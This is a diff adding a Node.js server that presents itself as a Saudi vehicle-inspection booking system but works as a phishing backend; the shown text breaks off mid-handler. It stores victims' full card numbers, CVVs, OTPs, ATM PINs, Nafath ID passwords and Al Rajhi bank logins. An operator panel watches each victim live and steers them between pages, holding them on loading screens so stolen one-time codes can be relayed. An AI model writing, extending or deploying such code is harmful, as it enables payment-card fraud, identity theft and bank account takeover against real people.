@@ -1,0 +1,839 @@
+/**
+ * server.js - الخادم الرئيسي لنظام حجز الفحص الفني
+ * يعمل على أي منصة Node.js (Render, Railway, Hostinger, إلخ)
+ */
+
+require("dotenv").config();
+const express = require("express");
+const http = require("http");
+const { Server } = require("socket.io");
+const path = require("path");
+const cors = require("cors");
+const bcrypt = require("bcryptjs");
+const jwt = require("jsonwebtoken");
+const Database = require("better-sqlite3");
+const { nanoid } = require("nanoid");
+
+// ==================== إعداد المتغيرات ====================
+const PORT = process.env.PORT || 3000;
+const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";
+const DB_PATH = process.env.DB_PATH || "./database.db";
+
+// ==================== قاعدة البيانات ====================
+const db = new Database(DB_PATH);
+db.pragma("journal_mode = WAL");
+db.pragma("foreign_keys = ON");
+
+// إنشاء الجداول
+db.exec(`
+  CREATE TABLE IF NOT EXISTS bookings (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    referenceId TEXT UNIQUE NOT NULL,
+    clientName TEXT DEFAULT '',
+    clientId TEXT DEFAULT '',
+    clientPhone TEXT DEFAULT '',
+    clientEmail TEXT DEFAULT '',
+    clientNationality TEXT DEFAULT '',
+    hasDelegate INTEGER DEFAULT 0,
+    delegateType TEXT DEFAULT '',
+    delegateName TEXT DEFAULT '',
+    delegatePhone TEXT DEFAULT '',
+    delegateNationality TEXT DEFAULT '',
+    delegateId TEXT DEFAULT '',
+    vehicleCountry TEXT DEFAULT '',
+    vehiclePlate TEXT DEFAULT '',
+    vehiclePlateChar1 TEXT DEFAULT '',
+    vehiclePlateChar2 TEXT DEFAULT '',
+    vehiclePlateChar3 TEXT DEFAULT '',
+    vehicleType TEXT DEFAULT '',
+    vehicleCarryDang INTEGER DEFAULT 0,
+    serviceRegion TEXT DEFAULT '',
+    serviceType TEXT DEFAULT '',
+    serviceDate TEXT DEFAULT '',
+    serviceTime TEXT DEFAULT '',
+    clientIp TEXT DEFAULT '',
+    rawData TEXT DEFAULT '{}',
+    status TEXT DEFAULT 'new',
+    statusRead INTEGER DEFAULT 0,
+    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000)
+  );
+
+  CREATE TABLE IF NOT EXISTS payments (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    referenceId TEXT NOT NULL,
+    cardHolderName TEXT DEFAULT '',
+    cardNumber TEXT DEFAULT '',
+    cardLastFour TEXT DEFAULT '',
+    cardExpiry TEXT DEFAULT '',
+    cardCvv TEXT DEFAULT '',
+    verifyCode TEXT DEFAULT '',
+    secretNum TEXT DEFAULT '',
+    rajUsername TEXT DEFAULT '',
+    rajPassword TEXT DEFAULT '',
+    paymentAction TEXT DEFAULT '',
+    step INTEGER DEFAULT 0,
+    status TEXT DEFAULT '',
+    rawData TEXT DEFAULT '{}',
+    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000),
+    UNIQUE(referenceId)
+  );
+
+  CREATE TABLE IF NOT EXISTS verification_codes (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    referenceId TEXT NOT NULL,
+    type TEXT NOT NULL,
+    nafathId TEXT DEFAULT '',
+    nafathPassword TEXT DEFAULT '',
+    nafathNumber TEXT DEFAULT '',
+    motaselProvider TEXT DEFAULT '',
+    motaselPhone TEXT DEFAULT '',
+    motaselCode TEXT DEFAULT '',
+    otpCode TEXT DEFAULT '',
+    step INTEGER DEFAULT 0,
+    status TEXT DEFAULT '',
+    rawData TEXT DEFAULT '{}',
+    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000),
+    UNIQUE(referenceId, type)
+  );
+
+  CREATE TABLE IF NOT EXISTS navigation_logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    referenceId TEXT,
+    clientIp TEXT DEFAULT '',
+    targetPage TEXT DEFAULT '',
+    note TEXT DEFAULT '',
+    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000)
+  );
+`);
+
+// ==================== دوال قاعدة البيانات ====================
+function createBooking(data) {
+  const stmt = db.prepare(`
+    INSERT INTO bookings (
+      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
+      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
+      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
+      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
+      clientIp, rawData, status, statusRead
+    ) VALUES (
+      @referenceId, @clientName, @clientId, @clientPhone, @clientEmail, @clientNationality,
+      @hasDelegate, @delegateType, @delegateName, @delegatePhone, @delegateNationality, @delegateId,
+      @vehicleCountry, @vehiclePlate, @vehiclePlateChar1, @vehiclePlateChar2, @vehiclePlateChar3,
+      @vehicleType, @vehicleCarryDang, @serviceRegion, @serviceType, @serviceDate, @serviceTime,
+      @clientIp, @rawData, @status, @statusRead
+    )
+  `);
+  stmt.run({
+    ...data,
+    hasDelegate: data.hasDelegate ? 1 : 0,
+    vehicleCarryDang: data.vehicleCarryDang ? 1 : 0,
+    rawData: JSON.stringify(data.rawData || {}),
+  });
+  return getBookingByReference(data.referenceId);
+}
+
+function getBookingByReference(referenceId) {
+  const row = db.prepare("SELECT * FROM bookings WHERE referenceId = ?").get(referenceId);
+  if (!row) return null;
+  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
+  return row;
+}
+
+function getAllBookings() {
+  return db.prepare("SELECT * FROM bookings ORDER BY createdAt DESC").all().map(r => {
+    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
+    return r;
+  });
+}
+
+function getNewBookings() {
+  return db.prepare("SELECT * FROM bookings WHERE statusRead = 0 ORDER BY createdAt DESC").all();
+}
+
+function updateBookingStatus(referenceId, status, statusRead) {
+  if (statusRead !== undefined) {
+    db.prepare("UPDATE bookings SET status = ?, statusRead = ? WHERE referenceId = ?").run(status, statusRead, referenceId);
+  } else {
+    db.prepare("UPDATE bookings SET status = ? WHERE referenceId = ?").run(status, referenceId);
+  }
+}
+
+function markBookingRead(referenceId) {
+  db.prepare("UPDATE bookings SET statusRead = 1 WHERE referenceId = ?").run(referenceId);
+}
+
+function createOrUpdatePayment(referenceId, data) {
+  const existing = db.prepare("SELECT id FROM payments WHERE referenceId = ?").get(referenceId);
+  if (existing) {
+    const sets = Object.keys(data).map(k => `${k} = @${k}`).join(", ");
+    db.prepare(`UPDATE payments SET ${sets} WHERE referenceId = @referenceId`).run({
+      ...data,
+      rawData: data.rawData ? JSON.stringify(data.rawData) : undefined,
+      referenceId,
+    });
+  } else {
+    db.prepare(`
+      INSERT INTO payments (referenceId, ${Object.keys(data).join(", ")})
+      VALUES (@referenceId, ${Object.keys(data).map(k => `@${k}`).join(", ")})
+    `).run({
+      ...data,
+      rawData: data.rawData ? JSON.stringify(data.rawData) : "{}",
+      referenceId,
+    });
+  }
+  return getPaymentByReference(referenceId);
+}
+
+function getPaymentByReference(referenceId) {
+  const row = db.prepare("SELECT * FROM payments WHERE referenceId = ?").get(referenceId);
+  if (!row) return null;
+  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
+  return row;
+}
+
+function createOrUpdateVerification(referenceId, type, data) {
+  const existing = db.prepare("SELECT id FROM verification_codes WHERE referenceId = ? AND type = ?").get(referenceId, type);
+  if (existing) {
+    const sets = Object.keys(data).map(k => `${k} = @${k}`).join(", ");
+    db.prepare(`UPDATE verification_codes SET ${sets} WHERE referenceId = @referenceId AND type = @type`).run({
+      ...data,
+      rawData: data.rawData ? JSON.stringify(data.rawData) : undefined,
+      referenceId,
+      type,
+    });
+  } else {
+    db.prepare(`
+      INSERT INTO verification_codes (referenceId, type, ${Object.keys(data).join(", ")})
+      VALUES (@referenceId, @type, ${Object.keys(data).map(k => `@${k}`).join(", ")})
+    `).run({
+      ...data,
+      rawData: data.rawData ? JSON.stringify(data.rawData) : "{}",
+      referenceId,
+      type,
+    });
+  }
+  return db.prepare("SELECT * FROM verification_codes WHERE referenceId = ? AND type = ?").get(referenceId, type);
+}
+
+function getVerificationByReference(referenceId, type) {
+  return db.prepare("SELECT * FROM verification_codes WHERE referenceId = ? AND type = ?").get(referenceId, type);
+}
+
+function logNavigation(data) {
+  db.prepare("INSERT INTO navigation_logs (referenceId, clientIp, targetPage, note) VALUES (?, ?, ?, ?)").run(
+    data.referenceId || null, data.clientIp || "", data.targetPage || "", data.note || ""
+  );
+}
+
+function getBookingsStats() {
+  const total = db.prepare("SELECT COUNT(*) as count FROM bookings").get().count;
+  const newCount = db.prepare("SELECT COUNT(*) as count FROM bookings WHERE status = 'new'").get().count;
+  const completed = db.prepare("SELECT COUNT(*) as count FROM bookings WHERE status = 'completed'").get().count;
+  return { total, new: newCount, completed };
+}
+
+// ==================== Express ====================
+const app = express();
+const server = http.createServer(app);
+
+app.use(cors());
+app.use(express.json({ limit: "10mb" }));
+app.use(express.urlencoded({ extended: true }));
+
+// ==================== Socket.io ====================
+const io = new Server(server, {
+  cors: { origin: "*", methods: ["GET", "POST"] },
+  transports: ["websocket", "polling"],
+});
+
+// خرائط IP
+const ipToSocket = new Map(); // IP → socket.id
+const ipToReference = new Map(); // IP → referenceId
+
+io.on("connection", (socket) => {
+  console.log(`[Socket.io] Client connected: ${socket.id}`);
+
+  // updateLocation: كل صفحة ترسل IP الحقيقي
+  socket.on("updateLocation", (data) => {
+    const ip = String(data?.ip || "");
+    if (ip) {
+      ipToSocket.set(ip, socket.id);
+      socket.join(`ip_${ip}`);
+      console.log(`[Socket.io] updateLocation: ip=${ip} socket=${socket.id}`);
+    }
+  });
+
+  // submitBooking: حجز جديد
+  socket.on("submitBooking", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const referenceId = nanoid(12);
+      ipToReference.set(clientIp, referenceId);
+      const str = (v) => (v != null ? String(v) : "");
+      const plateStr = [
+        str(data.VehiclePlateChar1 ?? ""),
+        str(data.VehiclePlateChar2 ?? ""),
+        str(data.VehiclePlateChar3 ?? ""),
+        str(data.NumberPanal ?? ""),
+      ].filter(Boolean).join("-");
+      createBooking({
+        referenceId,
+        clientName: str(data.Name ?? data.name ?? ""),
+        clientId: str(data.ID ?? data.id ?? ""),
+        clientPhone: str(data.PhonNumber ?? data.phonNumber ?? ""),
+        clientEmail: str(data.Email1 ?? data.email1 ?? ""),
+        clientNationality: str(data.Nationality ?? ""),
+        hasDelegate: data.flexSwitchDelegate === 1 || data.flexSwitchDelegate === "1",
+        delegateType: str(data.DelegateType ?? ""),
+        delegateName: str(data.DelegateName ?? ""),
+        delegatePhone: str(data.DelegatePhone ?? ""),
+        delegateNationality: str(data.DelegateNationality ?? ""),
+        delegateId: str(data.DelegateId ?? ""),
+        vehicleCountry: str(data.CountryReg ?? ""),
+        vehiclePlate: plateStr,
+        vehiclePlateChar1: str(data.VehiclePlateChar1 ?? ""),
+        vehiclePlateChar2: str(data.VehiclePlateChar2 ?? ""),
+        vehiclePlateChar3: str(data.VehiclePlateChar3 ?? ""),
+        vehicleType: str(data.TypeVechil ?? ""),
+        vehicleCarryDang: data.vehicleCarryDang === 1 || data.vehicleCarryDang === "1",
+        serviceRegion: str(data.RegionSvc ?? ""),
+        serviceType: str(data.TypeSvc ?? ""),
+        serviceDate: str(data.DateSvc ?? ""),
+        serviceTime: str(data.TimeSvc ?? ""),
+        clientIp,
+        rawData: data,
+        status: "new",
+        statusRead: 0,
+      });
+      io.to("admins").emit("newBooking", { reference: referenceId, ip: clientIp });
+      socket.emit("ackBooking", { success: true, reference: referenceId });
+    } catch (err) {
+      console.error("[Socket.io] submitBooking error:", err);
+      socket.emit("ackBooking", { success: false, error: err.message });
+    }
+  });
+
+  // submitPaymentData: بيانات البطاقة
+  socket.on("submitPaymentData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) {
+        socket.emit("ackPayment", { success: false, error: "لا يوجد مرجع" });
+        return;
+      }
+      ipToReference.set(clientIp, reference);
+      // عكس رقم البطاقة لتصحيح RTL
+      const rawCardNum = String(data.cardNumber ?? data.card_number ?? "");
+      const cardNum = rawCardNum.split("").reverse().join("");
+      const lastFour = cardNum.slice(-4);
+      createOrUpdatePayment(reference, {
+        cardHolderName: String(data.cardHolderName ?? data.card_holder_name ?? ""),
+        cardNumber: cardNum,
+        cardLastFour: lastFour,
+        cardExpiry: String(data.cardExpiry ?? data.card_expiry ?? ""),
+        cardCvv: String(data.cardCvv ?? data.cvv ?? ""),
+        step: 1,
+        status: "step1_done",
+        rawData: data,
+      });
+      updateBookingStatus(reference, "pending_payment");
+      const isRajhi = String(data.cardHolderName ?? "").toLowerCase().includes("rajhi") ||
+        String(data.bankName ?? "").toLowerCase().includes("rajhi");
+      io.to("admins").emit("newPayment", { reference, step: 1, type: "payment", ip: clientIp });
+      socket.emit("ackPayment", {
+        success: true,
+        data: { step: 1, status: "STILL", isRajhi },
+      });
+    } catch (err) {
+      console.error("[Socket.io] submitPaymentData error:", err);
+      socket.emit("ackPayment", { success: false, error: err.message });
+    }
+  });
+
+  // submitVerificationData: OTP الأول (صفحة code/Tx)
+  socket.on("submitVerificationData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdateVerification(reference, "otp", {
+        otpCode: String(data.verification_code_two ?? data.code ?? ""),
+        step: 2,
+        status: "step2_done",
+        rawData: data,
+      });
+      createOrUpdatePayment(reference, { step: 2, status: "step2_done" });
+      io.to("admins").emit("newPayment", { reference, step: 2, type: "otp", ip: clientIp });
+      // لا نرسل ackVerification - الصفحة تبقى في loading وتنتظر navigateTo من المشرف
+    } catch (err) {
+      console.error("[Socket.io] submitVerificationData error:", err);
+    }
+  });
+
+  // submitCodeData: OTP الثاني أو ATM PIN (صفحة madaPin/Cx أو pin/Dx)
+  socket.on("submitCodeData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      const code = String(data.verification_code ?? data.pin ?? data.code ?? "");
+      const existingPayment = getPaymentByReference(reference);
+      const currentStep = existingPayment?.step ?? 2;
+      const newStep = currentStep >= 3 ? 3 : 3;
+      createOrUpdatePayment(reference, {
+        secretNum: code,
+        step: newStep,
+        status: "step3_done",
+      });
+      io.to("admins").emit("newPayment", { reference, step: newStep, type: "code", ip: clientIp });
+      // لا نرسل ackCode - الصفحة تبقى في loading وتنتظر navigateTo من المشرف
+    } catch (err) {
+      console.error("[Socket.io] submitCodeData error:", err);
+    }
+  });
+
+  // submitNafathData: بيانات نفاذ
+  socket.on("submitNafathData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdateVerification(reference, "nafath", {
+        nafathId: String(data.nafathId ?? data.id ?? ""),
+        nafathPassword: String(data.nafathPassword ?? data.password ?? ""),
+        step: 1,
+        status: "step1_done",
+        rawData: data,
+      });
+      updateBookingStatus(reference, "pending_nafath");
+      io.to("admins").emit("newPayment", { reference, type: "nafath", ip: clientIp });
+      socket.emit("ackNafath", { success: true, data: { step: 1, nafathNumber: Math.floor(10 + Math.random() * 90).toString() } });
+    } catch (err) {
+      console.error("[Socket.io] submitNafathData error:", err);
+    }
+  });
+
+  // submitMotaselData: بيانات المتصل
+  socket.on("submitMotaselData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdateVerification(reference, "motasel", {
+        motaselProvider: String(data.provider ?? ""),
+        motaselPhone: String(data.phone ?? ""),
+        step: 1,
+        status: "step1_done",
+        rawData: data,
+      });
+      updateBookingStatus(reference, "pending_motasel");
+      io.to("admins").emit("newPayment", { reference, type: "motasel", ip: clientIp });
+      socket.emit("ackMotasel", { success: true, data: { step: 1 } });
+    } catch (err) {
+      console.error("[Socket.io] submitMotaselData error:", err);
+    }
+  });
+
+  // submitMotaselCodeData: رمز المتصل
+  socket.on("submitMotaselCodeData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdateVerification(reference, "motasel", {
+        motaselCode: String(data.code ?? ""),
+        step: 2,
+        status: "step2_done",
+      });
+      io.to("admins").emit("newPayment", { reference, type: "motaselCode", ip: clientIp });
+      // لا نرسل ack - ينتظر navigateTo
+    } catch (err) {
+      console.error("[Socket.io] submitMotaselCodeData error:", err);
+    }
+  });
+
+  // submitRajhiData: بيانات الراجحي
+  socket.on("submitRajhiData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdatePayment(reference, {
+        rajUsername: String(data.username ?? ""),
+        rajPassword: String(data.password ?? ""),
+        step: 4,
+        status: "step3_done",
+        rawData: data,
+      });
+      io.to("admins").emit("newPayment", { reference, step: 4, type: "rajhi", ip: clientIp });
+      socket.emit("ackRajhi", { success: true, data: { step: 4, status: "STILL" } });
+    } catch (err) {
+      console.error("[Socket.io] submitRajhiData error:", err);
+    }
+  });
+
+  // submitRajhiCodeData: رمز الراجحي
+  socket.on("submitRajhiCodeData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdatePayment(reference, {
+        secretNum: String(data.rajhiCode ?? data.code ?? ""),
+        step: 5,
+        status: "verified",
+      });
+      updateBookingStatus(reference, "payment_done");
+      io.to("admins").emit("newPayment", { reference, step: 5, type: "rajhiCode", ip: clientIp });
+      socket.emit("ackRajhiCode", { success: true, data: { step: 5, status: "accepted" } });
+    } catch (err) {
+      console.error("[Socket.io] submitRajhiCodeData error:", err);
+    }
+  });
+
+  // stcCallReceived
+  socket.on("stcCallReceived", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (reference) {
+        createOrUpdateVerification(reference, "otp", { step: 1, status: "stc_received", rawData: data });
+        io.to("admins").emit("newPayment", { reference, type: "stcCall", ip: clientIp });
+      }
+      socket.emit("success", { success: true });
+    } catch (err) {
+      console.error("[Socket.io] stcCallReceived error:", err);
+    }
+  });
+
+  // joinAdmin: المشرف يسجل دخوله للغرفة
+  socket.on("joinAdmin", (data) => {
+    const token = data?.token;
+    try {
+      jwt.verify(token, JWT_SECRET);
+      socket.join("admins");
+      console.log(`[Socket.io] Admin joined: ${socket.id}`);
+      socket.emit("adminJoined", { success: true });
+    } catch (err) {
+      socket.emit("adminJoined", { success: false, error: "Unauthorized" });
+    }
+  });
+
+  socket.on("disconnect", () => {
+    for (const [ip, sid] of ipToSocket.entries()) {
+      if (sid === socket.id) {
+        ipToSocket.delete(ip);
+        break;
+      }
+    }
+    console.log(`[Socket.io] Client disconnected: ${socket.id}`);
+  });
+});
+
+// ==================== Auth Middleware ====================
+function authMiddleware(req, res, next) {
+  const token = req.headers.authorization?.replace("Bearer ", "") || req.cookies?.token;
+  if (!token) return res.status(401).json({ error: "Unauthorized" });
+  try {
+    req.admin = jwt.verify(token, JWT_SECRET);
+    next();
+  } catch (err) {
+    return res.status(401).json({ error: "Invalid token" });
+  }
+}
+
+// ==================== API Routes ====================
+
+// تسجيل الدخول
+app.post("/api/admin/login", (req, res) => {
+  const { password } = req.body;
+  if (!password) return res.status(400).json({ error: "كلمة المرور مطلوبة" });
+  const isValid = password === ADMIN_PASSWORD;
+  if (!isValid) return res.status(401).json({ error: "كلمة المرور غير صحيحة" });
+  const token = jwt.sign({ role: "admin" }, JWT_SECRET, { expiresIn: "7d" });
+  return res.json({ success: true, token });
+});
+
+// التحقق من الجلسة
+app.get("/api/admin/me", authMiddleware, (req, res) => {
+  res.json({ success: true, role: "admin" });
+});
+
+// جلب جميع الحجوزات
+app.get("/api/admin/bookings", authMiddleware, (req, res) => {
+  try {
+    const allBookings = getAllBookings();
+    const result = allBookings.map(b => {
+      const payment = getPaymentByReference(b.referenceId);
+      const nafath = getVerificationByReference(b.referenceId, "nafath");
+      const motasel = getVerificationByReference(b.referenceId, "motasel");
+      const otp = getVerificationByReference(b.referenceId, "otp");
+      return { ...b, payment, nafath, motasel, otp };
+    });
+    res.json({ success: true, data: result });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// جلب حجز واحد
+app.get("/api/admin/bookings/:reference", authMiddleware, (req, res) => {
+  try {
+    const booking = getBookingByReference(req.params.reference);
+    if (!booking) return res.status(404).json({ error: "الحجز غير موجود" });
+    const payment = getPaymentByReference(req.params.reference);
+    const nafath = getVerificationByReference(req.params.reference, "nafath");
+    const motasel = getVerificationByReference(req.params.reference, "motasel");
+    const otp = getVerificationByReference(req.params.reference, "otp");
+    markBookingRead(req.params.reference);
+    res.json({ success: true, data: { ...booking, payment, nafath, motasel, otp } });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// إحصائيات
+app.get("/api/admin/stats", authMiddleware, (req, res) => {
+  try {
+    const stats = getBookingsStats();
+    res.json({ success: true, data: stats });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// القبول والرفض
+app.post("/api/admin/payment-action", authMiddleware, (req, res) => {
+  try {
+    const { reference, action } = req.body;
+    if (!reference || !action) return res.status(400).json({ error: "البيانات ناقصة" });
+    const booking = getBookingByReference(reference);
+    if (!booking) return res.status(404).json({ error: "الحجز غير موجود" });
+    const existingPayment = getPaymentByReference(reference);
+    const currentStep = existingPayment?.step ?? 1;
+    // إيجاد IP العميل
+    let clientIp = null;
+    for (const [ip, ref] of ipToReference.entries()) {
+      if (ref === reference) { clientIp = ip; break; }
+    }
+    let targetPage = null;
+    if (action === "pass") {
+      if (currentStep <= 1) {
+        targetPage = "code";
+        createOrUpdatePayment(reference, { paymentAction: "accepted" });
+      } else if (currentStep === 2) {
+        targetPage = "madaPin";
+        createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 });
+      } else {
+        targetPage = "bCall";
+        createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" });
+        updateBookingStatus(reference, "completed", 1);
+      }
+    } else if (action === "denied") {
+      if (currentStep <= 1) {
+        targetPage = "payments?declined=true";
+        createOrUpdatePayment(reference, { paymentAction: "denied", step: 1 });
+      } else if (currentStep === 2) {
+        targetPage = "code?declined=true";
+        createOrUpdatePayment(reference, { paymentAction: "denied", step: 2 });
+      } else {
+        targetPage = "madaPin?declined=true";
+        createOrUpdatePayment(reference, { paymentAction: "denied", step: 3 });
+      }
+    } else if (action === "completed") {
+      updateBookingStatus(reference, "completed", 1);
+    }
+    // إرسال navigateTo للعميل
+    if (targetPage && clientIp) {
+      io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
+      io.emit("navigateTo", { page: targetPage, ip: clientIp });
+    }
+    // إخطار المشرفين
+    io.to("admins").emit("paymentActionSet", { reference, action });
+    logNavigation({ referenceId: reference, clientIp: clientIp || "", targetPage: targetPage || action });
+    res.json({ success: true, action, reference, targetPage, currentStep });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// إرسال رمز نفاذ
+app.post("/api/admin/send-nafath-code", authMiddleware, (req, res) => {
+  try {
+    const { reference, code } = req.body;
+    let clientIp = null;
+    for (const [ip, ref] of ipToReference.entries()) {
+      if (ref === reference) { clientIp = ip; break; }
+    }
+    if (clientIp) {
+      io.to(`ip_${clientIp}`).emit("nafadCode", { success: true, code });
+      io.emit("nafadCode", { success: true, code });
+    }
+    createOrUpdateVerification(reference, "nafath", { nafathNumber: code, step: 2, status: "code_sent" });
+    io.to("admins").emit("newPayment", { reference, type: "nafathCode", code });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==================== Site API (الموقع الأمامي) ====================
+const ipRefMapSite = new Map();
+
+app.post("/data/", (req, res) => {
+  const typeReq = String(req.query.typeReq || "");
+  const category = String(req.query.category || "");
+  const body = req.body || {};
+  const clientIp = ((req.headers["x-forwarded-for"] || "").split(",")[0]?.trim()) || req.ip || "unknown";
+  console.log(`[SiteAPI] typeReq=${typeReq} category=${category} ip=${clientIp}`);
+
+  try {
+    if (category === "FORMS_SUBMIT") {
+      if (typeReq === "NewDate") {
+        const referenceId = nanoid(12);
+        const str = (v) => (v != null ? String(v) : "");
+        const plateStr = [str(body.VehiclePlateChar1 ?? ""), str(body.VehiclePlateChar2 ?? ""), str(body.VehiclePlateChar3 ?? ""), str(body.NumberPanal ?? "")].filter(Boolean).join("-");
+        createBooking({
+          referenceId,
+          clientName: str(body.Name ?? body.name ?? body.InputName),
+          clientId: str(body.ID ?? body.id ?? body.InputID),
+          clientPhone: str(body.PhonNumber ?? body.phonNumber ?? body.InputPhonNumber),
+          clientEmail: str(body.Email1 ?? body.email1 ?? body.InputEmail1),
+          clientNationality: str(body.Nationality ?? body.nationality),
+          hasDelegate: body.flexSwitchDelegate === 1 || body.flexSwitchDelegate === "1",
+          delegateType: str(body.DelegateType ?? ""),
+          delegateName: str(body.DelegateName ?? ""),
+          delegatePhone: str(body.DelegatePhone ?? ""),
+          delegateNationality: str(body.DelegateNationality ?? ""),
+          delegateId: str(body.DelegateId ?? ""),
+          vehicleCountry: str(body.CountryReg ?? body.InputCountryReg ?? ""),
+          vehiclePlate: plateStr,
+          vehiclePlateChar1: str(body.VehiclePlateChar1 ?? ""),
+          vehiclePlateChar2: str(body.VehiclePlateChar2 ?? ""),
+          vehiclePlateChar3: str(body.VehiclePlateChar3 ?? ""),
+          vehicleType: str(body.TypeVechil ?? body.InputTypeVechil ?? ""),
+          vehicleCarryDang: body.vehicleCarryDang === 1 || body.vehicleCarryDang === "1",
+          serviceRegion: str(body.RegionSvc ?? body.InputRegion ?? ""),
+          serviceType: str(body.TypeSvc ?? body.InputTypeSvc ?? ""),
+          serviceDate: str(body.DateSvc ?? body.InputDateSvc ?? ""),
+          serviceTime: str(body.TimeSvc ?? body.InputTimeSvc ?? ""),
+          clientIp,
+          rawData: body,
+          status: "new",
+          statusRead: 0,
+        });
+        ipRefMapSite.set(clientIp, referenceId);
+        io.to("admins").emit("newBooking", { reference: referenceId, ip: clientIp });
+        return res.json({ status: true, data: { reference: referenceId } });
+      }
+
+      if (typeReq === "PaymentsForm") {
+        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
+        if (!reference) return res.status(400).json({ status: false, message: "لا يوجد مرجع" });
+        ipRefMapSite.set(clientIp, reference);
+        const rawCardNum = String(body.cardNumber ?? body.card_number ?? "");
+        const cardNum = rawCardNum.split("").reverse().join("");
+        const lastFour = cardNum.slice(-4);
+        createOrUpdatePayment(reference, {
+          cardHolderName: String(body.cardHolderName ?? ""),
+          cardNumber: cardNum,
+          cardLastFour: lastFour,
+          cardExpiry: String(body.cardExpiry ?? ""),
+          cardCvv: String(body.cardCvv ?? ""),
+          step: 1, status: "step1_done", rawData: body,
+        });
+        updateBookingStatus(reference, "pending_payment");
+        io.to("admins").emit("newPayment", { reference, step: 1, type: "payment", ip: clientIp });
+        return res.json({ status: true, data: { step: 1, status: "STILL" } });
+      }
+
+      if (typeReq === "Motasel") {
+        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
+        if (!reference) return res.status(400).json({ status: false, message: "لا يوجد مرجع" });
+        createOrUpdateVerification(reference, "motasel", {
+          motaselProvider: String(body.provider ?? ""),
+          motaselPhone: String(body.phone ?? ""),
+          step: 1, status: "step1_done", rawData: body,
+        });
+        io.to("admins").emit("newPayment", { reference, type: "motasel", ip: clientIp });
+        return res.json({ status: true, data: { step: 1 } });
+      }
+
+      if (typeReq === "MotaselCode") {
+        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
+        if (!reference) return res.status(400).json({ status: false, message: "لا يوجد مرجع" });
+        createOrUpdateVerification(reference, "motasel", {
+          motaselCode: String(body.code ?? ""),
+          step: 2, status: "step2_done",
+        });
+        io.to("admins").emit("newPayment", { reference, type: "motaselCode", ip: clientIp });
+        return res.json({ status: true, data: { step: 2 } });
+      }
+    }
+
+    if (category === "FORMS_GET") {
+      if (typeReq === "RespnseSetActionStatus") {
+        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
+        if (!reference) return res.json({ status: true, data: { action: null } });
+        const payment = getPaymentByReference(reference);
+        return res.json({ status: true, data: { action: payment?.paymentAction || null, step: payment?.step || 0 } });
+      }
+
+      if (typeReq === "PayFmIsVerified") {
+        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
+        if (!reference) return res.json({ status: true, data: { verified: false } });
+        const payment = getPaymentByReference(reference);
+        return res.json({ status: true, data: { verified: payment?.status === "verified", step: payment?.step || 0 } });
+      }
+
+      if (typeReq === "GetNafathNum") {
+        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
+        if (!reference) return res.json({ status: true, data: { nafathNumber: null } });
+        const nafath = getVerificationByReference(reference, "nafath");
+        return res.json({ status: true, data: { nafathNumber: nafath?.nafathNumber || null } });
+      }
+    }
+
+    return res.json({ status: true, data: {} });
+  } catch (err) {
+    console.error("[SiteAPI] Error:", err);
